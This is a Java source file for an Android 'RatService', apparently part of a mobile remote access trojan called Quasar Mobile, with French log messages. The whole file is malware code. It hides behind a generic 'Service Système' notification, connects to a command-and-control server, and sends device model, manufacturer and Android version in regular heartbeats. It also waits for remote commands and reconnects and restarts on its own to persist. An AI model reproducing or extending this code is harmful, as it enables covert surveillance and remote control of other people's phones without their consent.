// RatService.java
package com.yourcompany.quasarmobile;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.json.JSONException;
import org.json.JSONObject;
import io.socket.client.IO;
import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.util.Timer;
import java.util.TimerTask;

public class RatService extends Service {

    private static final String TAG = "RatService";
    private static final String CHANNEL_ID = "QuasarMobileServiceChannel";
    private Socket mSocket;
    private String mDeviceId = null;
    private boolean isConnected = false;
    private Timer heartbeatTimer;
    private Handler handler = new Handler();

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service RAT créé.");
        createNotificationChannel();
        startForegroundService();
        setupSocketConnection();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "Quasar Mobile Service Channel",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private void startForegroundService() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service Système")
            .setContentText("Traitement en cours...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW);
        startForeground(1, builder.build());
    }

    private void setupSocketConnection() {
        try {
            IO.Options opts = new IO.Options();
            mSocket = IO.socket(Constants.C2_SERVER_URL, opts);

            mSocket.on(Socket.EVENT_CONNECT, args -> {
                isConnected = true;
                Log.d(TAG, "Connecté au serveur C&C.");
                mSocket.emit("request_id");
                startHeartbeat();
            });

            mSocket.on(Socket.EVENT_DISCONNECT, args -> {
                isConnected = false;
                Log.d(TAG, "Déconnecté du serveur C&C.");
                stopHeartbeat();
                scheduleReconnection();
            });

            mSocket.on("assignedId", args -> {
                if (args.length > 0 && args[0] instanceof String) {
                    mDeviceId = (String) args[0];
                    Log.d(TAG, "ID de l'appareil assigné par le serveur: " + mDeviceId);
                }
            });

            mSocket.on("command", args -> {
                if (args.length > 0 && args[0] instanceof JSONObject) {
                    JSONObject commandJson = (JSONObject) args[0];
                    try {
                        String command = commandJson.getString("command");
                        Log.d(TAG, "Commande reçue: " + command);
                        handleCommand(command, commandJson.optJSONObject("payload"));
                    } catch (JSONException e) {
                        Log.e(TAG, "Erreur lors de la réception de la commande", e);
                    }
                }
            });

            mSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                Log.e(TAG, "Erreur de connexion au serveur C&C", (Exception) args[0]);
                isConnected = false;
                stopHeartbeat();
                scheduleReconnection();
            });

            mSocket.connect();

        } catch (URISyntaxException e) {
            Log.e(TAG, "Erreur d'URI pour le serveur C&C", e);
            isConnected = false;
            scheduleReconnection();
        }
    }

    private void startHeartbeat() {
        stopHeartbeat();
        heartbeatTimer = new Timer();
        heartbeatTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isConnected && mDeviceId != null) {
                    sendHeartbeat();
                } else if (!isConnected) {
                    stopHeartbeat();
                }
            }
        }, 0, Constants.HEARTBEAT_INTERVAL_MS);
         Log.d(TAG, "Heartbeat démarré.");
    }

    private void stopHeartbeat() {
        if (heartbeatTimer != null) {
            heartbeatTimer.cancel();
            heartbeatTimer = null;
            Log.d(TAG, "Heartbeat arrêté.");
        }
    }

    private void sendHeartbeat() {
        if (mSocket != null && mSocket.connected() && mDeviceId != null) {
            try {
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("deviceId", mDeviceId);
                deviceInfo.put("model", android.os.Build.MODEL);
                deviceInfo.put("androidVersion", android.os.Build.VERSION.RELEASE);
                deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
                mSocket.emit("heartbeat", deviceInfo);
                Log.v(TAG, "Heartbeat envoyé.");
            } catch (JSONException e) {
                Log.e(TAG, "Erreur lors de la création du JSON de heartbeat", e);
            }
        }
    }

    private void handleCommand(String command, @Nullable JSONObject payload) {
        switch (command) {
            case "ping":
                Log.d(TAG, "Reçu PING.");
                try {
                    JSONObject response = new JSONObject();
                    response.put("status", "pong");
                    if (payload != null && payload.has("commandId")) {
                        response.put("commandId", payload.getString("commandId"));
                    }
                    mSocket.emit("response", response);
                } catch (JSONException e) {
                    Log.e(TAG, "Erreur lors de l'envoi de PONG", e);
                }
                break;
            default:
                Log.w(TAG, "Commande inconnue: " + command);
                break;
        }
    }

    private void scheduleReconnection() {
        handler.postDelayed(() -> {
            if (!isConnected) {
                Log.d(TAG, "Tentative de reconnexion...");
                setupSocketConnection();
            }
        }, 5000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service RAT démarré.");
        if (mSocket == null || !mSocket.connected()) {
            setupSocketConnection();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service RAT arrêté.");
        stopHeartbeat();
        if (mSocket != null) {
            mSocket.disconnect();
            mSocket.off();
        }
        isConnected = false;
        handler.removeCallbacksAndMessages(null);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
